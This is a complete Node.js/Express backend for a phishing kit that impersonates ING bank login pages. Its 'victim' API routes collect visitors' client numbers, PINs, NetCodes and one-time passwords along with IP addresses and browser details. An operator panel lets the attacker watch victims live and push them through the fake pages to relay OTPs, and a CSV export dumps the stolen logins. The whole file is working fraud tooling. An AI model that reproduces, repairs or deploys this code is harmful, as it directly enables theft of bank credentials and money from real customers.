/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

/* ----------  CONFIG  ---------- */
const PANEL_USER = process.env.PANEL_USER || 'admin';
const PANEL_PASS = process.env.PANEL_PASS || 'changeme';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const COOKIE_NAME = 'pan_sess_v2';

const app = express();
const PORT = process.env.PORT || 3000;

console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', PORT });

/* ----------  TRUST PROXY ---------- */
app.set('trust proxy', 1);

/* ----------  MIDDLEWARE ORDER IS CRITICAL ---------- */
// 1. CORS first
app.use(cors());

// 2. Body parsers BEFORE cookie parser and routes
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 3. Cookie parsing
app.use((req, res, next) => {
  req.cookies = {};
  if (req.headers.cookie) {
    req.headers.cookie.split(';').forEach(cookie => {
      const [name, ...rest] = cookie.trim().split('=');
      if (name && rest.length > 0) {
        req.cookies[name] = rest.join('=');
      }
    });
  }
  next();
});

/* ----------  CACHE CONTROL MIDDLEWARE ---------- */
app.use((req, res, next) => {
  if (req.path.startsWith('/panel') || req.path.startsWith('/api/')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
  }
  next();
});

/* ----------  CUSTOM SESSION MIDDLEWARE ---------- */
function signCookie(value, secret) {
  return crypto.createHmac('sha256', secret).update(value).digest('base64url');
}

function setSessionCookie(res, data) {
  const encoded = Buffer.from(JSON.stringify(data)).toString('base64url');
  const signature = signCookie(encoded, SESSION_SECRET);
  const value = `${encoded}.${signature}`;

  res.cookie(COOKIE_NAME, value, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
    expires: new Date(Date.now() + 24 * 60 * 60 * 1000),
    path: '/'
  });
}

function getSessionCookie(req) {
  const cookie = req.cookies?.[COOKIE_NAME];
  if (!cookie) return null;

  try {
    const [encoded, signature] = cookie.split('.');
    if (!encoded || !signature) return null;

    const expectedSig = signCookie(encoded, SESSION_SECRET);
    if (signature !== expectedSig) {
      console.log('[DEBUG] Cookie signature mismatch');
      return null;
    }

    return JSON.parse(Buffer.from(encoded, 'base64url').toString());
  } catch (e) {
    console.log('[DEBUG] Cookie parse error:', e.message);
    return null;
  }
}

function clearSessionCookie(res) {
  res.clearCookie(COOKIE_NAME, {
    path: '/',
    httpOnly: true,
    secure: true,
    sameSite: 'lax'
  });
}

// Session middleware
app.use((req, res, next) => {
  req.session = getSessionCookie(req) || {};

  if (req.session.authed) {
    req.session.lastActivity = Date.now();
  }

  console.log(`[DEBUG] Host: ${req.headers.host}, URL: ${req.url}, Method: ${req.method}, Authed: ${req.session?.authed}, Body:`, req.body);

  req.session.save = () => setSessionCookie(res, req.session);
  req.session.destroy = () => {
    clearSessionCookie(res);
    req.session = {};
  };

  next();
});

/* ----------  STATIC FILES ---------- */
app.use(express.static(__dirname));

/* ----------  STATE  ---------- */
const sessionsMap = new Map();
const sessionActivity = new Map();
const auditLog = [];
let victimCounter = 0;
let successfulLogins = 0;
let currentDomain = '';

/* ----------  STATIC ROUTES  ---------- */
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html', (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html', (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  PANEL ACCESS CONTROL  ---------- */
app.get('/panel', (req, res) => {
  if (req.session?.authed === true) {
    req.session.save();
    return res.sendFile(__dirname + '/_panel.html');
  }
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  console.log(`[DEBUG] Login attempt - body:`, req.body);
  
  const { user, pw } = req.body || {};
  console.log(`[DEBUG] Login attempt - user: ${user}, pw: ${pw ? '***' : 'undefined'}`);

  if (user === PANEL_USER && pw === PANEL_PASS) {
    req.session.authed = true;
    req.session.username = user;
    req.session.loginTime = Date.now();
    req.session.lastActivity = Date.now();
    req.session.save();
    console.log(`[DEBUG] Login success - session saved`);
    
    // Check if request is from fetch API (JSON)
    const contentType = req.headers['content-type'] || '';
    if (contentType.includes('application/json')) {
      return res.json({ success: true, redirect: '/panel' });
    }
    
    return res.redirect(303, '/panel');
  }

  console.log(`[DEBUG] Login failed - expected user: ${PANEL_USER}, got: ${user}`);
  
  // Check if request is from fetch API (JSON)
  const contentType = req.headers['content-type'] || '';
  if (contentType.includes('application/json')) {
    return res.status(401).json({ success: false, error: 'Invalid credentials' });
  }
  
  res.redirect(303, '/panel?fail=1');
});

// Catch-all for /panel/* sub-paths
app.get(/^\/panel\/(.*)$/, (req, res) => res.redirect(302, '/panel'));

app.post('/panel/logout', (req, res) => {
  req.session.destroy();
  
  // Check if request is from fetch API (JSON)
  const contentType = req.headers['content-type'] || '';
  if (contentType.includes('application/json')) {
    return res.json({ success: true, redirect: '/panel' });
  }
  
  res.redirect(303, '/panel');
});

app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));

/* ----------  DOMAIN HELPER  ---------- */
app.use((req, res, next) => {
  const host = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER  ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

/* ----------  SESSION HEADER HELPER - FIXED FOR VERIFY.HTML ---------- */
function getSessionHeader(v) {
  // Approved/Success state
  if (v.page === 'success' || v.status === 'approved') return `🦁 ING Login approved`;
  
  // index.html page (initial login)
  if (v.page === 'index.html') {
    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
  } 
  
  // verify.html page (NetCode/OTP entry) - THIS IS THE MAIN PAGE NOW
  else if (v.page === 'verify.html') {
    // Check for OTP first (since verify.html now handles OTP)
    if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
    // Fall back to phone/NetCode if no OTP yet
    return v.phone ? `🔑 Received NetCode: ${v.phone}` : `⏳ Awaiting OTP/NetCode`;
  } 
  
  // unregister.html page
  else if (v.page === 'unregister.html') {
    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
  } 
  
  // otp.html page (legacy, should not be used)
  else if (v.page === 'otp.html') {
    if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
    return `⏳ Awaiting OTP...`;
  }
  
  // Default fallback - also check if OTP exists on any page
  if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
  
  return `⏳ Waiting...`;
}

function cleanupSession(sid, reason, silent = false) {
  const v = sessionsMap.get(sid);
  if (!v) return;
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
}

/* ----------  VICTIM API  ---------- */
app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    const dateStr = now.toLocaleString();

    victimCounter++;
    const victim = {
      sid, ip, ua, dateStr,
      entered: false, email: '', password: '', phone: '', otp: '', billing: '',
      page: 'index.html',
      platform: uaParser(ua).os?.name || 'n/a',
      browser: uaParser(ua).browser?.name || 'n/a',
      attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
      status: 'loaded', victimNum: victimCounter,
      interactions: [],
      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
    };
    sessionsMap.set(sid, victim);
    sessionActivity.set(sid, Date.now());
    res.json({ sid });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

app.post('/api/login', async (req, res) => {
  try {
    const { sid, email, password } = req.body;
    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.entered = true; v.email = email; v.password = password;
    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });

    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/verify', async (req, res) => {
  try {
    const { sid, phone } = req.body;
    if (!phone?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.phone = phone; v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${phone}` });

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.phone = phone;
    res.sendStatus(200);
  } catch (e) {
    console.error('Verify error', e);
    res.sendStatus(500);
  }
});

app.post('/api/unregister', async (req, res) => {
  try {
    const { sid } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.unregisterClicked = true; v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });

    res.sendStatus(200);
  } catch (err) {
    console.error('Unregister error', err);
    res.status(500).send('Error');
  }
});

// FIXED: /api/otp now properly stores OTP and logs it
app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp } = req.body;
    console.log(`[DEBUG] OTP received - sid: ${sid}, otp: ${otp}`);
    
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    v.otp = otp; 
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });

    // Also update audit log
    const entry = auditLog.find(e => e.sid === sid);
    if (entry) {
      entry.otp = otp;
      console.log(`[DEBUG] OTP saved to audit log for victim ${entry.victimN}`);
    } else {
      console.log(`[DEBUG] No audit log entry found for sid: ${sid}`);
    }
    
    console.log(`[DEBUG] OTP stored successfully. Current victim data:`, {
      sid: v.sid,
      page: v.page,
      otp: v.otp,
      status: v.status
    });
    
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/page', async (req, res) => {
  try {
    const { sid, page } = req.body;
    console.log(`[DEBUG] Page change - sid: ${sid}, page: ${page}`);
    
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    
    const v = sessionsMap.get(sid);
    const oldPage = v.page;
    v.page = page;
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });

    res.sendStatus(200);
  } catch (err) {
    console.error('Page change error', err);
    res.status(500).send('Error');
  }
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });
  res.json({ status: v.status });
});

app.post('/api/clearRedo', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'redo') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/clearOk', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'ok') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/interaction', (req, res) => {
  const { sid, type, data } = req.body;
  if (!sessionsMap.has(sid)) return res.sendStatus(404);
  const v = sessionsMap.get(sid);
  v.lastInteraction = Date.now();
  v.interactions = v.interactions || [];
  v.interactions.push({ type, data, time: Date.now() });
  sessionActivity.set(sid, Date.now());
  res.sendStatus(200);
});

/* ----------  PANEL API  ---------- */
app.get('/api/user', (req, res) => {
  if (req.session?.authed) {
    req.session.lastActivity = Date.now();
    req.session.save();
    return res.json({ username: req.session.username || PANEL_USER });
  }
  res.status(401).json({ error: 'Not authenticated' });
});

function buildPanelPayload() {
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
    entered: v.entered, unregisterClicked: v.unregisterClicked,
    activityLog: v.activityLog || []
  }));
  return {
    domain: currentDomain,
    username: PANEL_USER,
    totalVictims: victimCounter,
    active: list.length,
    waiting: list.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: list,
    logs: auditLog.slice(-50).reverse()
  };
}

// Long-poll for panel updates
app.get('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  req.session.lastActivity = Date.now();
  req.session.save();

  res.json(buildPanelPayload());
});

app.post('/api/panel', async (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  req.session.lastActivity = Date.now();
  req.session.save();

  const { action, sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  console.log(`[DEBUG] Panel action: ${action}, sid: ${sid}, current page: ${v.page}, current status: ${v.status}`);

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo'; v.entered = false; v.email = ''; v.password = ''; v.otp = '';
      } else if (v.page === 'verify.html') {
        // verify.html now handles OTP, so clear OTP on redo
        v.status = 'redo'; v.otp = ''; v.phone = '';
      } else if (v.page === 'otp.html') {
        v.status = 'redo'; v.otp = ''; v.otpAttempt++;
      }
      break;
    case 'cont':
      // FIXED: Handle each page type separately without setting status at the beginning
      if (v.page === 'index.html') {
        v.status = 'ok';
        v.page = 'verify.html';
        console.log(`[DEBUG] Continue from index.html -> verify.html, status: ok`);
      }
      else if (v.page === 'verify.html') {
        // When admin clicks continue on verify.html (OTP page), set status to 'ok' for redirect
        v.status = 'ok';
        v.page = 'success';
        successfulLogins++;
        console.log(`[DEBUG] Continue from verify.html -> success, status: ok`);
      }
      else if (v.page === 'unregister.html') {
        v.status = 'ok';
        v.page = 'verify.html';
        console.log(`[DEBUG] Continue from unregister.html -> verify.html, status: ok`);
      }
      else if (v.page === 'otp.html') { 
        v.status = 'ok';
        v.page = 'success'; 
        successfulLogins++;
        console.log(`[DEBUG] Continue from otp.html -> success, status: ok`);
      }
      break;
    case 'delete':
      cleanupSession(sid, 'deleted from panel');
      break;
  }
  
  console.log(`[DEBUG] After action: page=${v.page}, status=${v.status}`);
  res.json({ ok: true });
});

/* ----------  SESSION REFRESH (NEW)  ---------- */
app.post('/api/refresh', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  // Clear all victim sessions and data
  sessionsMap.clear();
  sessionActivity.clear();
  auditLog.length = 0;
  victimCounter = 0;
  successfulLogins = 0;

  console.log('[DEBUG] Session refreshed by admin');
  res.json({ ok: true });
});

/* ----------  CSV EXPORT  ---------- */
app.get('/api/export', (req, res) => {
  if (!req.session?.authed) return res.status(401).send('Unauthorized');

  req.session.lastActivity = Date.now();
  req.session.save();

  const successes = auditLog
    .filter(r => r.phone && r.otp)
    .map(r => ({
      victimNum: r.victimN,
      email: r.email,
      password: r.password,
      phone: r.phone,
      otp: r.otp,
      ip: r.ip,
      ua: r.ua,
      timestamp: new Date(r.t).toISOString()
    }));

  const csv = [
    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
  ].map(r=>r.join(',')).join('\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
  res.send(csv);
});

/* ----------  START  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Panel user: ${PANEL_USER}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
});
